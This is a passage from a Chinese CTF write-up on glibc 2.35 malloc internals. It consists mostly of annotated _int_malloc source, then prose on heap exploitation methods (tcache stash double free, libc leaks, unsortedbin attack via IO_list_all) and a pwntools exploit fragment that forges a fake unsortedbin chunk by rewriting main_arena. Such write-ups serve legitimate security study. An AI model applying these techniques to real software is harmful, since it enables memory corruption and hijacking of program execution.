USE_TCACHE</span><br><span class="line">      /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="line">     filling the cache, return one of the cached ones.  */ </span><br><span class="line">      ++tcache_unsorted_count;   //检查tcachebin链表中的chunk是否超过范围</span><br><span class="line">      if (return_cached</span><br><span class="line">      &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</span><br><span class="line">      &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define MAX_ITERS       10000</span><br><span class="line">          if (++iters &gt;= MAX_ITERS)</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If all the small chunks we found ended up cached, return one now.  */</span><br><span class="line">      if (return_cached)  //如果之前把chunk放到tcachebin里面 这里取出来就可以了</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         If a large request, scan through the chunks of current bin in</span><br><span class="line">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="line">       */</span><br><span class="line">      //如果申请的chunk大小在largebin的范围里 就扫描largebinchunk来查找最合适的chunk</span><br><span class="line">      if (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          /* skip scan if empty or largest chunk is too small */</span><br><span class="line">          if ((victim = first (bin)) != bin</span><br><span class="line">          &amp;&amp; (unsigned long) chunksize_nomask (victim)</span><br><span class="line">            &gt;= (unsigned long) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              while (((unsigned long) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (unsigned long) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              /* Avoid removing the first entry for a size so that the skip</span><br><span class="line">                 list does not have to be rerouted.  */</span><br><span class="line">              if (victim != last (bin)</span><br><span class="line">          &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">            == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              /* Exhaust */</span><br><span class="line">              if (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              /* Split */</span><br><span class="line">              else</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">                     have to perform a complete insert here.  */</span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">          if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks&quot;);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  if (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                      remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         Search for a chunk by scanning bins, starting with next largest</span><br><span class="line">         bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="line">         (with ties going to approximately the least recently used) chunk</span><br><span class="line">         that fits is selected.</span><br><span class="line"></span><br><span class="line">         The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="line">         The particular case of skipping all bins during warm-up phases</span><br><span class="line">         when no chunks have been returned yet is faster than it might look.</span><br><span class="line">       */</span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);   //后面这一部分关于内存桶的 暂时没看懂</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      map = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      for (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          /* Skip rest of block if there are no more set bits in this block.  */</span><br><span class="line">          if (bit &gt; map || bit == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              do</span><br><span class="line">                &#123;</span><br><span class="line">                  if (++block &gt;= BINMAPSIZE) /* out of bins */</span><br><span class="line">                    goto use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              while ((map = av-&gt;binmap[block]) == 0);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Advance to bin with set bit. There must be one. */</span><br><span class="line">          while ((bit &amp; map) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">              assert (bit != 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Inspect the bin. It is likely to be non-empty */</span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          /*  If a false alarm (empty bin), clear the bit. */</span><br><span class="line">          if (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              /*  We know the first chunk in this bin is big enough to use. */</span><br><span class="line">              assert ((unsigned long) (size) &gt;= (unsigned long) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              /* unlink */</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              /* Exhaust */</span><br><span class="line">              if (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              /* Split */</span><br><span class="line">              else</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">                     have to perform a complete insert here.  */</span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">          if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 2&quot;);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  /* advertise as last remainder */</span><br><span class="line">                  if (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  if (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                      remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      /*</span><br><span class="line">         If large enough, split off the chunk bordering the end of memory</span><br><span class="line">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="line">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="line">         less well fitting) than any other available chunk since it can</span><br><span class="line">         be extended to be as large as necessary (up to system</span><br><span class="line">         limitations).</span><br><span class="line"></span><br><span class="line">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="line">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="line">         exhausted by current request, it is replenished. (The main</span><br><span class="line">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="line">         to put in fenceposts in sysmalloc.)</span><br><span class="line">       */</span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      if (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (&quot;malloc(): corrupted top size&quot;);</span><br><span class="line"></span><br><span class="line">      if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* When we are using atomic ops to free fast chunks we can get</span><br><span class="line">         here for all block sizes.  */</span><br><span class="line">      else if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          /* restore original bin index */</span><br><span class="line">          if (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          else</span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         Otherwise, relay to handle system-dependent cases</span><br><span class="line">       */</span><br><span class="line">      else</span><br><span class="line">        &#123;</span><br><span class="line">          void *p = sysmalloc (nb, av);</span><br><span class="line">          if (p != NULL)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这几百行代码读下来 感觉还是有点蒙蔽的  总结一下<br>首先判断nb是否属于fastbin的范围 如果属于则获取fastbin对应链表的链表头 当链表中存在空闲chunk的时候 将chunk从fastbin链表中取出(遵从先进先出原则) 同时 如果开启了tcachebin机制 当tcachebin对应链表尚有空闲(一条链表默认最大存储7个chunk) 并且fastbin该链表中取出一个chunk后 仍有剩余 就会触发tcache stash机制 会将fastbin链表中的chunk转移到tcachebin中<br>这一机制存在漏洞利用的可能 在glibc2.29以后 tcachebin针对double free进行了安全防护 当chunk被释放进入链表后 chunk的bk域就会被写入key key的值为堆地址去除后三位 攻击者需要更改key 才能实现double free 而fastbin对于double free的检查 只会比较上一次和这次释放的指针是否一致 所以就可以通过在fastbin中实现double free 然后触发tcache stash来将链表放到tcachebin中<br>接着如果nb大小在smallbin的范围内 就遍历smallbin 因为smallbin的链表和fastbin tcachebin一样 每一个范围内的大小都有一个链表 查询起来更加快速 这一段代码同样引入了tcache stash机制 来确保内存申请的效率<br>如果nb的大小在largebin的范围内 就会调用malloc_consolidata函数 这个函数会合并物理相邻的fastbin chunk 很多时候 这一个函数也会导致许多漏洞 比如此时两个物理相邻的fastbin chunkA和B 如果用户手里有UAF的权限 在触发malloc_consolidata之前 控制的只是一个fastbin chunk 触发只会 就会合并成smallbin chunk 此时chunk的fd和bk域就填充了libc真实地址 如果用户利用UAF漏洞 就可以泄露libc基址<br>接下来的代码负责处理从unsortedbin中申请chunk 最为关键的就是如下这些check 这些check保证了攻击者不会构造unsortedbin chunk的fd域和bk域 从而实现任意地址申请chunk以及任意地址写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;  //获取链表中的倒数第二个chunk</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址</span><br><span class="line">          if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)   //安全性检查</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)  //检查下一个chunk的size是否符合要求</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))  //检查next_chunk的prev_size是否正确</span><br><span class="line">            malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">          if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br></pre></td></tr></table></figure>
<p>unsorted_chunks(av)可以获取unsortedbin链表的链表头指针 当链表头的bk域指向自己 也就是链表中 链表头和链表尾都为同一个chunk的时候 说明这个链表中已经没有其他的chunk了 那么就不会进入while循环 这一个check看似简单 但是实际上起到了非常大的防御功能 我在伪造chunk时 就是无法绕过这一个check来跳过while循环<br>第一个check 检查victim的size是否符合要求<br>第二个和第三个check 检查victim物理相邻的chunk的size和prev_size是否符合要求<br>第四个check 检查victim上一个chunk(bck)的fd域是否指向victim 确保链表的完整性<br>第五个check 检查next_chunk的prev_size的inuse位 因为处于unsortedbin链表中的chunk肯定都是处于free状态的 如果inuse不为0 就触发报错<br>同时 在从unsortedbin中申请chunk后 还会有两句负责完善chunk的fd域和bk域 从而确保链表连通性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim))  //安全性检查</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>这两句即是2.31版本以前的unsortedbin attack攻击手法所利用到的 通过覆盖unsortedbin chunk的bk域 将其修改为ptr_addr - 0x10 在执行到 bck-&gt;fd &#x3D; unsorted_chunks(av)时 就会往ptr_addr写入unsortedbin的链表头地址 配合io链就可以覆写IO_list_all 从而伪造io结构体 劫持程序执行流<br>但是在2.31以后 作者优化了对unsortedbin chunk的链表检查 在不修改main_arena的情况下 已经无法实现任意地址写了 在后续的步骤3中 我将说明如何通过修改main_arena来实现任意地址申请的逻辑漏洞<br>回到源代码中 如果要申请的chunk大小等于链表中的chunk大小 会先将符合要求的chunk转移到tcachebin中(如果对应链表尚有空闲) 随后在第二次执行时 由于链表已经为空不进入while循环 直接从tcachebin中申请chunk<br>如果大小不一致 会根据unsortedbin中的chunk大小来判断要将chunk放入largebin还是smallbin 随后再进行分配</p>
<p>如果想要伪造一个fake chunk加入unsortedbin链表 并且实现利用realloc函数把这个fake chunk申请出来 就需要更改链表头chunk的bk域<br>接下来 需要更改这个fake chunk的fd域 让其指向main_arena 同时要做好伪造 修改fake chunk的size域 以及其物理相邻的下一个chunk的chunk头信息也要做好伪造<br>做好这些前置工作 还需要绕过的判断就是 如何不进入while循环 只要我们没有完善链表结构 程序就会一直认为 链表中还存在chunk 就一直遍历 报错是必然发生的事<br>想要把fake chunk从链表中脱离出来 要解决的关键就是如下这个check</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk  </span><br><span class="line">bck = victim-&gt;bk;  </span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构  </span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))  </span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);  </span><br><span class="line">victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av) </span><br></pre></td></tr></table></figure>
<p>Victim指向fake chunk   bck指向fake chunk的bk域<br>需要使得bck的fd域指向fake chunk 还需要使得fake chunk指向main_arena<br>看似很容易满足 但是关键是下次进入while循环时 victim就会指向bck<br>如果此时bck的bk域不等于main_arena 就会重新进入while循环 那么此时bck的链表结构又需要重新布置 并且进入死循环<br>但是实际上这是不可能的 除非我们去申请的是main_arena 但是这仍然需要我们拥有更改main_arena的权限 这样才能绕过size和prevsize的检查<br>那么既然必须更改main_arena 有没有更容易的篡改方案 首先把fake chunk的bk域改为指向unsorted_chunks(av) 那么while循环的check就可以绕过去了<br>接下来则是需要绕过bck-&gt;fd &#x3D;&#x3D; victim这一条判断<br>使得unsorted_chunks(av)指向victim 即修改main_arena+96+0x10处为vitcim</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bss_addr = elf.bss(0x300)</span><br><span class="line">add(0x500,&quot;aaaa&quot;)#0</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#1</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#2</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">heap_addr = u64(io.recv(5).ljust(8,b&#x27;\x00&#x27;))&lt;&lt;12</span><br><span class="line">success(&quot;heap_addrr :&quot;+hex(heap_addr))</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x1f2ce0</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x500,&quot;aaaa&quot;)#3</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#4</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#5</span><br><span class="line"></span><br><span class="line">add(0x500,&quot;aaaa&quot;)#6</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#7</span><br><span class="line">delete(6)</span><br><span class="line">payload = p64(libc_addr + 0x1f2ce0)+p64(bss_addr)</span><br><span class="line"></span><br><span class="line">edit(6,len(payload),payload)</span><br><span class="line">any_write(p64(bss_addr+0x8),p64(0x30)+p64(heap_addr+0x7e0)+p64(libc_addr+0x1f2ce0))</span><br><span class="line">payload = p64(0x30)+p64(0x20)</span><br><span class="line">any_write(p64(bss_addr+0x30),payload)</span><br><span class="line">any_write(p64(libc_addr+0x1f2ce0+0x10),p64(bss_addr))</span><br><span class="line">gdb.attach(io,&#x27;b *malloc+10&#x27;)</span><br><span class="line">add(0x20,&quot;aaaa&quot;)#8</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202412202230980.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202412202230980.png" alt="image.png"></a><br>可以成功的把伪造的fake chunk申请出来<br>为了实现这一次非法内存申请 需要泄露heap地址以及libc地址<br>修改unsortedbin chunk的bk域<br>修改fake chunk的size域 fd域 bk域 以及其next chunk的prev_size和size域<br>修改main_arena+96+0x10处为fake chunk<br>由此可见glibc2.35对于unsortedbin的检查十分严格 我们需要对内存空间有极大的可控制性才能绕过check</p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cardmaster"><span class="toc-number">1.</span> <span class="toc-text">cardmaster</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6wp"><span class="toc-number">1.1.</span> <span class="toc-text">赛时wp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-realloc%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">后记 realloc详解</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&text=网鼎杯半决赛"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&is_video=false&description=网鼎杯半决赛"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=网鼎杯半决赛&body=Check out this article: http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&title=网鼎杯半决赛"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&name=网鼎杯半决赛&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/&t=网鼎杯半决赛"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2025
    C12en
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'c12en';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
